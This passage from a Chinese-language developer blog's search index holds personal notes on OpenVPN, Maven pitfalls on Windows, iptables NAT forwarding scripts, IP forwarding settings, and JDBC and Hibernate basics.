vpn curl ifconfig.me # 看國家(看流量) curl ipinfo.io 完成 ","date":"2020-06-25","objectID":"/blog/posts/Linux-%E4%BD%BF%E7%94%A8-openvpn-%E9%80%A3%E7%B7%9A%E5%B0%8F%E8%A8%98/:0:0","tags":["linux"],"title":"Linux 使用 openvpn 連線小記","uri":"/blog/posts/Linux-%E4%BD%BF%E7%94%A8-openvpn-%E9%80%A3%E7%B7%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Apache"],"content":"TODO: 有空詳細補 ","date":"2020-06-18","objectID":"/blog/posts/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/:0:0","tags":["tls","https","hsts"],"title":"SSL Pinning 和 HSTS 小記","uri":"/blog/posts/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/"},{"categories":["Apache"],"content":"SSL Pinning SSL漏洞修正方式 - SSL憑證推薦網 | SSL憑證 | code Sign 從 SSL 到 SSL Pinning 看完你就懂！ - 技術雜記 Technology Notes - Jack Yu | 傑克 dialogs/electron-ssl-pinning: Prevents MITM in Electron applications ","date":"2020-06-18","objectID":"/blog/posts/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/:1:0","tags":["tls","https","hsts"],"title":"SSL Pinning 和 HSTS 小記","uri":"/blog/posts/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/"},{"categories":["Apache"],"content":"HSTS https://blog.macs1207.dev/ ","date":"2020-06-18","objectID":"/blog/posts/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/:2:0","tags":["tls","https","hsts"],"title":"SSL Pinning 和 HSTS 小記","uri":"/blog/posts/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"一些使用小記 branch 資料夾命名，可以在 branch 命 feature/fixed_bug 會產生資料夾 左邊介面的分支，可做拖拉 branch 到 別的 branch，會產生合併，非常方便 其他: gitKraken 6.5.0 免收费破解 - 掘金 GitKraken：和你的私有仓库说再见吧。我：但是，我拒绝 - 知乎 ","date":"2020-06-18","objectID":"/blog/posts/GitKraken-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:0:0","tags":["git"],"title":"GitKraken 使用小記","uri":"/blog/posts/GitKraken-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"最近工作機會難得，有空摸 maven 沒想到想說簡單的建置小專案 就遇到一堆雷 在這邊筆記 ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"安裝 我用 chocolate 安裝 安裝可參考: How to Install Apache Maven on Ubuntu 18.04 | Linuxize ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"請不要使用 Powershell!! 請不要使用 Powershell!! 請不要使用 Powershell!! 請不要使用 Powershell!! 很重要，所以我說三遍 就算用爛爛的 cmd ，也不要浪費大量時間處理 powershell 好像是 Powershell -D 會有問題 我就沒有詳細研究了 【坑】【maven】在PowerShell窗口下执行maven命令行报错：Unknown lifecycle phase .test.skip=true._三年小白的博客-CSDN博客 用 Powershell Script 大概會看到 [ERROR] Unknown lifecycle phase \"/home/tucson/Projects/kafkaGuideTest/target/Getting-Started-0.0.1-SNAPSHOT.jar\". You must specify a valid lifecycle phase or a goal in the format \u003cplugin-prefix\u003e:\u003cgoal\u003e or \u003cplugin-group-id\u003e:\u003cplugin-artifact-id\u003e[:\u003cplugin-version\u003e]:\u003cgoal\u003e. Available lifecycle phases are: validate, initialize, generate-sources, process-sources, generate-resources, process-resources, compile, process-classes, generate-test-sources, process-test-sources, generate-test-resources, p rocess-test-resources, test-compile, process-test-classes, test, prepare-package, package, pre-integration-test, integration-test, post-integration-test, verify, install, deploy, pre-site, site, post-site, site-deploy, pre-clean, clean, post-clean. -\u003e [Help 1] 但絕非你的指令錯誤 ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:2:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"建置 Maven ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:3:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"建置新專案 mvn archetype:create Choose archetype: 選擇建立Project的範本，預設是99:maven-archetype-quickstart建立一個最基本的Project Choose version: 選擇範本的版本，會列出一些範本可用的版本，其差異是就不用版本的範本可能會建立有不同的資源檔(比如可能附帶圖檔) 定義groupId: 輸入要建立Project所隸屬的組織或公司，如我自已用idv.kentyeh.software 定義artifactId: 就是Project名稱，例如 firstMaven 定義version: Project的版本號，預設是1.0-SNAPSHOT 定義package: 初始建立的Java Package, 如 idv.kentyeh.software Archetype有哪些 Archetype ArtifactIds 說明 maven-archetype-archetype 產生Archetype專案 maven-archetype-j2ee-simple 產生簡單的J2EE專案 maven-archetype-plugin 產生Maven plugin專案 maven-archetype-plugin-site 產生Maven plugin site專案 maven-archetype-portlet 產生JSR-268 Portlet專案 maven-archetype-profiles maven-archetype-quickstart 產生簡單的Maven專案 maven-archetype-site 產生Maven site專案 maven-archetype-site-simple 產生簡單的Maven site專案 maven-archetype-webapp 產生Maven Web App專案 以上最常使用maven-archetype-quickstart建立簡單的Maven專案， 及使用maven-archetype-webapp建立Maven Web專案，剩下的很少用（我個人沒用過）。 菜鳥工程師 肉豬: Maven 什麼是Archetype maven中的groupId和artifactId到底指的是什么？_孙雪峰-CSDN博客 ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:3:1","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"一種快速輸入建置方法 maven-archetype-quickstart (Java Project) mvn archetype:generate -DgroupId=com.yiibai.core -DartifactId=ProjectName -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false maven-archetype-webapp (Java Web Project) mvn archetype:generate -DgroupId=com.yiibai.web -DartifactId=ProjectName -DarchetypeArtifactId=maven-archetype-webapp -DinteractiveMode=false 作者：park 链接：https://juejin.im/post/5a1e1f76f265da432b4a92cb 来源：掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 題外話: Mave教學 | Maven 初學者中文教程 mvn archetype:create 我沒辦法使用… ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:3:2","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"加入依賴套件 \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.11\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient --\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-httpclient\u003c/groupId\u003e \u003cartifactId\u003ecommons-httpclient\u003c/artifactId\u003e \u003cversion\u003e3.1\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/com.google.code.gson/gson --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.google.code.gson\u003c/groupId\u003e \u003cartifactId\u003egson\u003c/artifactId\u003e \u003cversion\u003e2.2.4\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/net.sf.json-lib/json-lib --\u003e \u003cdependency\u003e \u003cgroupId\u003enet.sf.json-lib\u003c/groupId\u003e \u003cartifactId\u003ejson-lib\u003c/artifactId\u003e \u003cversion\u003e0.9\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:4:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"編譯 Java mvn compile [INFO] Scanning for projects... [INFO] [INFO] ---------------------------\u003c sample:sample \u003e---------------------------- [INFO] Building sample 1.0-SNAPSHOT [INFO] --------------------------------[ jar ]--------------------------------- [INFO] [INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ sample --- [INFO] Using 'UTF-8' encoding to copy filtered resources. [INFO] skip non existing resourceDirectory /home/xxx/sample/src/main/resources [INFO] [INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ sample --- [INFO] Nothing to compile - all classes are up to date [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 1.488 s [INFO] Finished at: 2020-06-15T20:30:00+08:00 [INFO] ------------------------------------------------------------------------ ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:5:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"執行 Java mvn exec:java -Dexec.mainClass=“sample.App” [INFO] Scanning for projects... [INFO] [INFO] ---------------------------\u003c sample:sample \u003e---------------------------- [INFO] Building sample 1.0-SNAPSHOT [INFO] --------------------------------[ jar ]--------------------------------- [INFO] [INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ sample --- Hello World! [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 1.573 s [INFO] Finished at: 2020-06-15T20:31:19+08:00 [INFO] ------------------------------------------------------------------------ ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:6:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"使用 mvn 在 win 我寫簡單 bat call mvn compile call mvn exec:java -Dexec.mainClass=\"sample.ExampleGetToken\" pause 這邊我踩到一個地雷 mvn 前面需要加 call 但是總是在執行的時候執行完一個mvn 目標後自動退出，pause命令也無效，分析原因為mvn本身是一個bat命令，因此在exit退出的時候，整個指令碼程序將退出，加入call命令呼叫即可。 參考來源:呼叫maven命令的BAT指令碼分享 | 程式前沿 ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:7:0","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Java"],"content":"科普小知識 Linux 沒有 pause # method 1 read -n 1 -p \"Press any key to continue...\" # method 2 read -n 1 -p \"Press any key to continue...\" INP if [ $INP != '' ] ; then echo -ne '\\b \\n' fi #! /bin/bash function pause(){ read -n 1 -p \"$*\" INP if [ $INP != '' ] ; then echo -ne '\\b \\n' fi } #使用時： pause 'Press any key to continue...' 好啦，其實用 Linux 應該都是打指令呼叫程式 應該比較不會有 window 問題 其他資源: bat結合maven 實現windows下maven自動打包指令碼 - IT閱讀 【坑】【maven】在PowerShell窗口下执行maven命令行报错：Unknown lifecycle phase .test.skip=true._三年小白的博客-CSDN博客 Maven创建项目时出现Generating project in Interactive mode就一直卡住的解决方案_程高伟-CSDN博客 菜鳥工程師 肉豬: Maven 什麼是Archetype 使用Maven模板创建项目 - 掘金 整合 Maven 與 Yeoman，學習筆記 (2) - 使用 mvn archetype:generate 建立 JAX-RS / Jersey 專案 | 格物致知 How to Install Apache Maven on Ubuntu 18.04 | Linuxize ","date":"2020-06-15","objectID":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/:7:1","tags":["mvn","java"],"title":"Maven 建置專案初體驗","uri":"/blog/posts/Maven-%E5%BB%BA%E7%BD%AE%E5%B0%88%E6%A1%88%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"之前有跟別的公司合作取得三組 VPN 帳號密碼 但是我們團隊有 10 人 這三組怎麼做 雖然最近專案已經結束了 我有看到使用 Linux iptables 設定 NAT 轉發封包 今天就簡單嘗試 ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:0:0","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"網路知識 臨時抱佛腳時間 ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:1:0","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"預設閘道 一般我的常設定 IP ，都會設定預設閘道 預設閘道通常都是設定中華電信小烏龜 一般可能不會去了解原因 這邊簡呆說明一下原因 之前幾篇有講到 CIDR 現在正常設定 IP 都會設定 Mask (網路遮罩) 只要超過遮罩時候，就會轉發到 預設閘道 就會根據路由器做轉發到別的網域 ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:1:1","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"NAT wifi 連線的時候，會自動分配 IP (DHCP) 通常拿到的 IP 都是私有網域 IP 所以外面的網路通常 PING 不到 SNAT 鳥哥的 Linux 私房菜 – Linux 防火牆與 NAT 伺服器 DNAT 一般常用的就是 Virtual Server，這就是一種 DNAT 鳥哥的 Linux 私房菜 – Linux 防火牆與 NAT 伺服器 ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:1:2","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"其他小記 Windows 10 和 Linux 如何轉發 IP 每一台電腦都可以擔任轉發動作，但一開始我在預設閘道怎麼沒有效果 其實都需要設定 PS: 小補轉發跨網域會發生什麼事情 一般轉發不會改變來源 IP 跨網域後封包不會送回來 Win 10 2、windows xp、Vista、windows7： 打开注册表：regedit.exe 打到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters 增加： Value Name: IpEnableRouterData Type: REG_DWORD Value: 1 重启机器。 ———————————————— 版权声明：本文为CSDN博主「kl222」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/kl222/java/article/details/12878755 打开windows的路由功能_康林工作室-CSDN博客 linux 一般在設定 iptables forward 但前置作業記得要先做這個動作 查詢IP forward功能是否開啟 cat /proc/sys/net/ipv4/ip_forward 0代表沒有啟動 1代表已啟動 暫時啟動IP forward功能 echo 1 \u003e /proc/sys/net/ipv4/ip_forward 重新開機就會失效 永久開啟IP forward功能 vi /etc/sysctl.conf 加上這句 net.ipv4.ip_forward = 1 立刻讓設定生效 sysctl -p IP forward @ 小志的隨便記 :: 痞客邦 :: ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:1:3","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"如何 SNAT 轉發 不錯文章 Linux ip forward - sparkdev - 博客园 如何在 Linux 下利用 iptables 快速設定 NAT 環境 | The Will Will Web 我這邊簡單實作讓另外一台沒網路用預設閘道連線 參考保哥範例如下 NAT(PC): wlp3s0: 192.168.1.117 (可以連線出去網段) wlp3s0: 192.168.100.2 （環境要做 NAT 網段) PC(一般): IP: 192.168.100.50(起設定在 192.168.100.0/24 範圍內) Mask: 255.255.255.0 Gateway: 192.168.100.2 # 1. Define variables ## WAN_IF 是設定轉發出去 IP \u0026 從哪邊轉發出去 ## 我這邊是 Linux 在 1 個 Wifi Interface 做 2 個 IP ## 這邊我主要是對另一台做連線動作 ## 保哥範例是 PPPOE ，這邊可以設定 VPN Interface WAN_IF=\"wlp3s0\" WAN_IP=\"192.168.1.117\" ## 進來 IP 做轉發，通常是設定區域網路 IP 範圍 ## 這邊我也是用同一個 Interface LAN_IF=\"wlp3s0\" LAN_IP=\"192.168.100.0/24\" # 2. modprobe /sbin/modprobe ip_tables /sbin/modprobe iptable_filter /sbin/modprobe ip_conntrack /sbin/modprobe ip_conntrack_ftp /sbin/modprobe ip_conntrack_irc /sbin/modprobe ipt_state /sbin/modprobe ipt_limit /sbin/modprobe ipt_REJECT /sbin/modprobe ipt_REDIRECT /sbin/modprobe ipt_LOG # 3. Flush \u0026 Reset iptables settings /sbin/iptables -F /sbin/iptables -X /sbin/iptables -Z /sbin/iptables -F -t nat /sbin/iptables -X -t nat /sbin/iptables -Z -t nat /sbin/iptables -P INPUT DROP /sbin/iptables -P OUTPUT ACCEPT /sbin/iptables -P FORWARD ACCEPT /sbin/iptables -t nat -P PREROUTING ACCEPT /sbin/iptables -t nat -P POSTROUTING ACCEPT /sbin/iptables -t nat -P OUTPUT ACCEPT # 4. Accept connection from LOCALHOST ( loopback ) /sbin/iptables -A INPUT -i lo -j ACCEPT # 5. Acception connection from some ports ( Firewall rules ) # /sbin/iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT # 6. Source NAT settings /sbin/iptables -A INPUT -i $LAN_IF -j ACCEPT echo \"1\" \u003e /proc/sys/net/ipv4/ip_forward /sbin/iptables -A POSTROUTING -t nat -o $WAN_IF -s $LAN_IP -j SNAT --to $WAN_IP # 8. Accept connection from ESTABLISHED and RELATED connection /sbin/iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT DNAT 就是這一段了 我有空研究再補 通常對方沒設定 SNAT 的時候 只能設定 DNAT(或安全因素) /sbin/iptables -t nat -A PREROUTING -p tcp -i ppp0 --dport 80 -j DNAT --to 192.168.100.104:80 最後設定這個不如使用 VPN 實做會不會比較方便? 有時間研究 ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:2:0","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"番外 iptables 可以設定對網域做調整 Blocking HTTP requests via Iptables for a specific domain – Defragged ","date":"2020-06-14","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/:3:0","tags":["linux","nat","iptables"],"title":"使用 iptables 實做 NAT 轉發封包","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/"},{"categories":["Linux"],"content":"Kill all processes that are running for more than 5 minutes by a given user in linux bash script - Server Fault ","date":"2020-06-09","objectID":"/blog/posts/Linux-%E6%9F%A5%E8%A9%A2%E5%9F%B7%E8%A1%8C%E5%BE%88%E4%B9%85%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:0:0","tags":["linux"],"title":"Linux 查詢執行很久程式方法","uri":"/blog/posts/Linux-%E6%9F%A5%E8%A9%A2%E5%9F%B7%E8%A1%8C%E5%BE%88%E4%B9%85%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"TODO: hibernate 尚未整理完成 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:0:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"介紹 Hibernate ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:1:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"傳統 JDBC 查詢 SQL Class.forName(\"com.mysql.jdbc.Driver\"); Connection conn = DriverManage.getConnection(url,username,password); String sql = \"SELECT * FROM user\"; PreparedStatment psmt = conn.prepareStatment(sql); ResultSet rs = pstm.executeQuery(); // while rs .... conn.close(); 一開始學 Java 我們都是這樣寫的 沒有仔細探討寫法 首先是 Class.forName 因為 Class.forName 有 static 執行 DriverManager.registerDriver(new Driver) JWorld@TW Java論壇 - Re:請問Class.forName()的用途 public class JdbcDemo { public static void main(String[] args) throws SQLException, ClassNotFoundException { String url = \"jdbc:mysql://127.0.0.1:3306/mydb\"; String username = \"root\"; String password = \"redhat\"; //Class.forName(\"com.mysql.jdbc.Driver\"); DriverManager.registerDriver(new Driver()); Connection connection = DriverManager.getConnection(url, username, password); String sql = \"SELECT * FROM msg\"; PreparedStatement prepareStatement = connection.prepareStatement(sql); ResultSet resultSet = prepareStatement.executeQuery(); resultSet.next(); String address = resultSet.getString(\"address\"); System.out.println(address); } } 發現代碼，還是正常的執行了。 總結一下: Class.forName 方法的作用，就是初始化給定的類。而我們給定的 MySQL 的 Driver 類中，它在靜態代碼塊中通過 JDBC 的 DriverManager 註冊了一下驅動。我們也可以直接使用 JDBC 的驅動管理器註冊 mysql 驅動，從而代替使用 Class.forName。 參考來源:Java class.forname 詳解 | 菜鳥教程 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:2:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"Hibernate ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:3:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"前置設定 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:4:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"jar 加載 Hibernate jar 包 下載連結5.4 series - Hibernate ORM lib/required,lib/jpa 底下需要載入jar Hibernate 日誌 jar 包 DB 驅動 Jar 包 MySQL JDBC驅動程式(mysql-connector-java-*.jar) ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:4:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"Maven 設定 設定檔原則上要放在 src 跟目錄，但 Java程式教學甘仔店: Hibernate Hello World Example 專案 之 XML Mapping 探討 Eclipse 加 resource 資料夾 其中 resources 是會抓到 target # copy resources to target cp -rf $PROJECT_DIR/resources/* $PROJECT_DIR/target 詳細可以看 javac 編譯:第1期：抛开IDE，了解一下javac如何编译 | 毛帅的博客 這篇可以有時間再做整理 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:4:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"設定 Hibernate ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:5:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"加入 dtd 用意 ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:5:1","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"設定實體類 hbm.xml ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:5:2","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"設定 Hibernate 核心檔 需要放在 src 底下，除非有做 resource (還需要設定 Eclipse) ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:5:3","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"一般實作 加載 Hibernate 核心文件 New sessionfactory 使用SessionFactory 創建 Session 物件 開起交易 CRUD 交易提交 關閉資源(Session,SessionFactory) ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:6:0","tags":["java","hibernate","dao"],"title":"Hibernate 建置起手式","uri":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/"},{"categories":["Java"],"content":"hibernate utils main 方法建置 table ","date":"2020-06-02","objectID":"/blog/posts/Hibernate-%E5%BB%BA%E7%BD%AE%E8%B5%B7%E6%89%8B/:7:0","tags":["java","hibernate","dao"],"title":"Hibernate 